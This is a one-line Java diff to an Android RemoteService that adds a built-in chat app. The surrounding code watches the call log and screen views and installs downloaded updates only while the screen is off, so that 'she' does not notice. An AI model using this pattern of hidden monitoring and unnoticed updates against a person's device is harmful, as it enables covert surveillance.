@@ -68,6 +68,7 @@ public class RemoteService extends Service {
         CallLogFeed.watch(this);
         ScreenViewGuard.watch(this);
         BuiltInApps.addOnce(this);
+        BuiltInApps.addChatOnce(this);
         if (screenOff == null) {
             // A downloaded update installs when the screen turns off, never while she's using the device.
             screenOff = new android.content.BroadcastReceiver() {
